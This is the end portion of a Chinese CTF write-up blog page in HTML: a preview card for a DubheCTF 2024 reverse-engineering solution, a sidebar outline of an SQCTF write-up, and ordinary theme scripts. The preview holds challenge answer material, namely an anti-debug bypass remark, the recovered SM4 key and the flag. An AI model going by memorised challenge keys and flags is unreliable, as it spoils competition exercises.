"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/a847d2e8-3959-45ff-ae49-6c6c928bf1f7.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-29</div><div class="info-item-2">DubheCTF 2024 re 复现</div></div><div class="info-2"><div class="info-item-1">DubheCTF reVMT有非常多的反调试，因此直接使用x32dbg+sharpOD过反调，中间发现一个类似Key的东西  输入aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa，运行到这key变了，且输出，好像发现我patch过程序了   key肯定是这俩中的一个  这个有点像密文  这个函数是个加密算法  cyberchef试了几种加密算法发现是SM4直接出了  DubheCTF{VMT_H00K_4ND_$3H_15_U53FUL} 12345from gmssl.sm4 import CryptSM4, SM4_DECRYPT, NoPaddingsm4_dec = CryptSM4(padding_mode=NoPadding)sm4_dec.set_key(b&#x27;Pyu0Z8#bC5vqUFgt&#x27;,...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/tx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Matriy</div><div class="author-info-description">不积硅步，无以至千里</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">219</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Matriy330"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">正在学习安卓逆向 (*^_^*)</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQCTF-WriteUp"><span class="toc-text">SQCTF WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FFT-IFFT"><span class="toc-text">FFT IFFT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%A9%E5%84%BF%E4%BB%AC%E7%AD%89%E6%88%91%E7%A0%B4%E5%86%9B"><span class="toc-text">孩儿们等我破军</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Welcome-Sign-in"><span class="toc-text">Welcome_Sign_in</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#love-host"><span class="toc-text">love.host</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-music1"><span class="toc-text">ez_music1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%8B%E8%80%85%E8%8D%A3%E8%80%80%E7%9C%9F%E6%98%AF%E5%A4%AA%E5%A5%BD%E7%8E%A9%E4%BA%86"><span class="toc-text">王者荣耀真是太好玩了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9D%E5%AE%9D%E4%BD%A0%E6%98%AF%E4%B8%80%E5%8F%AA%E7%99%BD%E8%89%B2%E5%A4%A7%E7%8C%AB%E7%8C%AB"><span class="toc-text">宝宝你是一只白色大猫猫</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%BF%E5%B0%BC%E4%BA%9A"><span class="toc-text">阿尼亚</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#piet"><span class="toc-text">piet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%81%E5%90%9B%E5%B1%B1%E7%9A%84%E8%90%BD%E6%97%A5%E5%A5%BD%E7%BE%8E"><span class="toc-text">老君山的落日好美</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%E5%8A%A0%E5%AF%86"><span class="toc-text">这是什么加密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E5%B7%B7%E4%BA%BA%E5%AE%B6"><span class="toc-text">小巷人家</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%88%E5%93%88"><span class="toc-text">哈哈</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RE"><span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezRe"><span class="toc-text">ezRe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%85%95%E7%84%B6%E5%9B%9E%E9%A6%96%EF%BC%8C%E9%82%A3%E4%BA%BA%E5%8D%B4%E5%9C%A8%E7%81%AF%E7%81%AB%E9%98%91%E7%8F%8A%E5%A4%84"><span class="toc-text">慕然回首，那人却在灯火阑珊处</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%B9%85%E9%B9%85%E9%B9%85%EF%BC%8C%E6%9B%B2%E9%A1%B9%E5%90%91%E5%A4%A9%E6%AD%8C"><span class="toc-text">鹅鹅鹅，曲项向天歌</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A3%E4%BA%BA%E5%BD%93%E4%BB%81%E4%B8%8D%E8%AE%A9"><span class="toc-text">圣人当仁不让</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BE%80%E4%BA%8B%E6%9A%97%E6%B2%89%E4%B8%8D%E5%8F%AF%E8%BF%BD"><span class="toc-text">往事暗沉不可追</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%87%E4%BA%8B%E4%B8%8D%E5%86%B3%EF%BC%8C%E5%8F%AF%E9%97%AE%E6%98%A5%E9%A3%8E"><span class="toc-text">遇事不决，可问春风</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%A5%E9%A3%8E%E4%B9%9F%E6%9C%89%E6%98%A5%E9%A3%8E%E6%84%81"><span class="toc-text">春风也有春风愁</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E8%8B%A5%E5%AE%89%E5%A5%BD%E4%BE%BF%E6%98%AF%E6%99%B4"><span class="toc-text">你若安好便是晴</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%BA%E7%94%9F%E8%87%AA%E5%8F%A4%E8%B0%81%E6%97%A0%E6%AD%BB"><span class="toc-text">人生自古谁无死</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A9%E4%B8%8B%E8%B0%81%E4%BA%BA%E4%B8%8D%E8%AF%86%E5%90%9B"><span class="toc-text">天下谁人不识君</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%94%A7%E5%94%A7%E5%A4%8D%E5%94%A7%E5%94%A7%EF%BC%8C%E6%9C%A8%E5%85%B0%E5%BD%93%E6%88%B7%E7%BB%87"><span class="toc-text">唧唧复唧唧，木兰当户织</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B3%E9%9A%8F%E6%9C%AC%E5%BF%83"><span class="toc-text">即随本心</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%8B%E5%B1%B1%E4%B8%8D%E6%98%AF%E5%B1%B1"><span class="toc-text">看山不是山</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%8A%B3%E6%98%A5%E9%A3%8E%E8%A7%A3%E6%88%91%E5%BF%A7"><span class="toc-text">不劳春风解我忧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BB%E8%B4%A5abyssun"><span class="toc-text">击败abyssun</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%85%E7%BA%A2%E6%AC%BA%E9%86%89%E7%B2%89%EF%BC%8C%E8%82%AF%E4%BF%A1%E6%9C%89%E6%B1%9F%E6%A2%85"><span class="toc-text">浅红欺醉粉，肯信有江梅</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%86%E5%8F%96%E4%BD%A0%E7%9A%84%E5%B0%8F%E7%8C%AB%E5%A8%98"><span class="toc-text">领取你的小猫娘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E8%A7%89%E5%90%9B%E9%9D%9E%E6%B1%A0%E4%B8%AD%E7%89%A9%EF%BC%8C%E5%92%AB%E5%B0%BA%E8%9B%9F%E9%BE%99%E4%BA%91%E9%9B%A8"><span class="toc-text">我觉君非池中物，咫尺蛟龙云雨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%9F%E5%8D%97%E6%97%A0%E6%89%80%E6%9C%89%EF%BC%8C%E8%81%8A%E8%B5%A0%E4%B8%80%E6%9E%9D%E6%98%A5"><span class="toc-text">江南无所有，聊赠一枝春</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%93%E6%97%B6%E5%8F%AA%E9%81%93%E6%98%AF%E5%AF%BB%E5%B8%B8"><span class="toc-text">当时只道是寻常</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%8C%E4%B9%A6%E6%B6%88%E5%BE%97%E6%B3%BC%E8%8C%B6%E9%A6%99"><span class="toc-text">赌书消得泼茶香</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A2%AB%E9%85%92%E8%8E%AB%E6%83%8A%E6%98%A5%E7%9D%A1%E9%87%8D"><span class="toc-text">被酒莫惊春睡重</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%9C%E9%9B%80%E6%98%A5%E6%B7%B1%E9%94%81%E4%BA%8C%E4%B9%94"><span class="toc-text">铜雀春深锁二乔</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%90%A7%E8%90%A7%E9%BB%84%E5%8F%B6%E9%97%AD%E7%96%8F%E7%AA%97"><span class="toc-text">萧萧黄叶闭疏窗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%80%9F%E7%9A%84%E4%B8%9C%E9%A3%8E%E7%A0%B4%E9%87%91%E9%94%81"><span class="toc-text">借的东风破金锁</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8A%B1%E9%9D%9E%E8%8A%B1%EF%BC%8C%E9%9B%BE%E9%9D%9E%E9%9B%BE-1-%E6%B2%A1%E5%87%BA"><span class="toc-text">花非花，雾非雾_1 [没出]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%95%86%E5%B8%88%E4%B8%80%E6%97%A5%E6%B8%B8"><span class="toc-text">商师一日游</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezGame"><span class="toc-text">ezGame</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#My-Blog"><span class="toc-text">My Blog</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Upload-Level1"><span class="toc-text">Upload_Level1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-include"><span class="toc-text">baby include</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Through"><span class="toc-text">Through</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-download"><span class="toc-text">File_download</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%94%AF%E4%B8%80"><span class="toc-text">唯一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eeaassyy"><span class="toc-text">eeaassyy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%83"><span class="toc-text">逃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ping"><span class="toc-text">Ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E5%B0%8F%E6%9F%A5%E8%AF%A2%E7%B3%BB%E7%BB%9F"><span class="toc-text">小小查询系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-rce"><span class="toc-text">baby rce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Input-a-number"><span class="toc-text">Input a number</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RceMe"><span class="toc-text">RceMe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Upload-Level2"><span class="toc-text">Upload_Level2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ez-calculate"><span class="toc-text">Ez_calculate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E6%9C%88%E5%85%89"><span class="toc-text">白月光</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Are-you-from-SQNU"><span class="toc-text">Are you from SQNU?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E8%A3%85"><span class="toc-text">伪装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Look-for-the-homepage"><span class="toc-text">Look for the homepage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ggoodd"><span class="toc-text">ggoodd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98%E7%9A%84%E5%B0%8F%E5%A4%B1%E8%AF%AF"><span class="toc-text">开发人员的小失误</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle"><span class="toc-text">pickle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E5%B1%95%E7%A4%BA%E5%8A%9F%E8%83%BD"><span class="toc-text">图片展示功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E4%B9%8B%E8%88%9E"><span class="toc-text">无参之舞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%8E%E5%91%80%E5%A4%A7%E5%A4%A7%E5%A4%A7%E9%BB%91%E5%A1%94"><span class="toc-text">哎呀大大大黑塔</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%98%BF%E5%98%BF%E5%98%BF"><span class="toc-text">嘿嘿嘿</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%A5%E9%A3%8E%E5%BE%97%E6%84%8F%E9%A9%AC%E8%B9%84%E7%96%BE"><span class="toc-text">春风得意马蹄疾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base"><span class="toc-text">base</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%AB%E9%98%B4%E9%98%B3%E6%88%91%E4%BA%86%E8%A1%8C%E5%90%97%EF%BC%9F"><span class="toc-text">别阴阳我了行吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%99%BD%E5%85%94%E7%99%BD%E5%8F%88%E7%99%BD"><span class="toc-text">小白兔白又白</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95RSA"><span class="toc-text">简单RSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezCRT"><span class="toc-text">ezCRT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%B1%E8%90%BD%E7%9F%BF%E6%B4%9E%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-text">失落矿洞中的密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E5%AE%A4%E9%80%83%E8%84%B1%E7%9A%84%E7%BB%88%E6%9E%81%E6%8C%91%E6%88%98"><span class="toc-text">密室逃脱的终极挑战</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%A2%E4%B8%89%E8%90%BD%E5%9B%9B%E7%9A%84%E5%B0%8FI"><span class="toc-text">丢三落四的小I</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%A9%E7%9A%84%E6%8C%BA%E5%8F%98%E6%80%81%E5%95%8A%E6%B8%85%E8%8C%B6%E5%93%A5"><span class="toc-text">玩的挺变态啊清茶哥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-SCA"><span class="toc-text">ez_SCA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E6%AF%8D%E7%9A%84%E8%BD%AE%E8%88%9E%E4%B8%8E%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E7%9A%84%E4%BA%A4%E5%93%8D%E6%9B%B2"><span class="toc-text">字母的轮舞与维吉尼亚的交响曲</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Common-Modulus"><span class="toc-text">Common Modulus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E7%9A%84%E5%A4%A9%E8%B5%8B%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-text">你的天赋是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%B1%E8%90%BD%E7%9F%BF%E6%B4%9E%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81-1"><span class="toc-text">失落矿洞中的密码</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2ade85f8/" title="DASCTF 2023 10 wp">DASCTF 2023 10 wp</a><time datetime="2025-10-02T16:00:00.000Z" title="发表于 2025-10-03 00:00:00">2025-10-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/41a159b6/" title="Angr 学习">Angr 学习</a><time datetime="2025-10-01T16:00:00.000Z" title="发表于 2025-10-02 00:00:00">2025-10-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/d932918b/" title="ios逆向初探">ios逆向初探</a><time datetime="2025-09-26T16:00:00.000Z" title="发表于 2025-09-27 00:00:00">2025-09-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/3a852357/" title="MoeCTF 2025 wp">MoeCTF 2025 wp</a><time datetime="2025-09-24T16:00:00.000Z" title="发表于 2025-09-25 00:00:00">2025-09-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/947a6269/" title="TSCTF 2022 wp">TSCTF 2022 wp</a><time datetime="2025-09-22T16:00:00.000Z" title="发表于 2025-09-23 00:00:00">2025-09-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Matriy</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><p><a style="margin-inline:5px"target="_blank" href="https://hexo.io/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为 Hexo" alt="HEXO"></a><a style="margin-inline:5px"target="_blank" href="https://butterfly.js.org/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用 Butterfly" alt="Butterfly"></a><a style="margin-inline:5px"target="_blank" href="https://www.jsdelivr.com/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用 Jsdelivr 为静态资源提供CDN加速" alt="Jsdelivr"></a><a style="margin-inline:5px"target="_blank" href="https://github.com/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由 GitHub 托管" alt="GitHub"></a><a style="margin-inline:5px"target="_blank"href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" alt="img" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p> <p>Hi, welcome to Matriy's <a target="_blank" rel="noopener" href="https://butterfly.js.org/">blog</a>!</p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">簡</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://twikoo.open-ctf.top/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const init = (el = document, path = location.pathname) => {
    twikoo.init({
      el: el.querySelector('#twikoo-wrap'),
      envId: 'https://twikoo.open-ctf.top/',
      region: '',
      onCommentLoaded: () => {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      },
      ...option,
      path: isShuoshuo ? path : (option && option.path) || path
    })

    GLOBAL_CONFIG_SITE.pageType === 'post' && getCount()

    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
      if (el.children.length) {
        el.innerHTML = ''
        el.classList.add('no-comment')
      }
    })
  }

  const loadTwikoo = (el, path) => {
    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
    else btf.getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(() => init(el, path))
  }

  if (isShuoshuo) {
    'Twikoo' === 'Twikoo'
      ? window.shuoshuoComment = { loadComment: loadTwikoo }
      : window.loadOtherComment = loadTwikoo
    return
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script></div><script async data-pjax src="/js/anzhiyu.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
  const destroyAplayer = () => {
    if (window.aplayers) {
      for (let i = 0; i < window.aplayers.length; i++) {
        if (!window.aplayers[i].options.fixed) {
          window.aplayers[i].destroy()
        }
      }
    }
  }

  const runMetingJS = () => {
    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
  }

  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"]):not([href="/music/"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => fn())
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      pjax.loadUrl('/404.html')
    }
  })
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>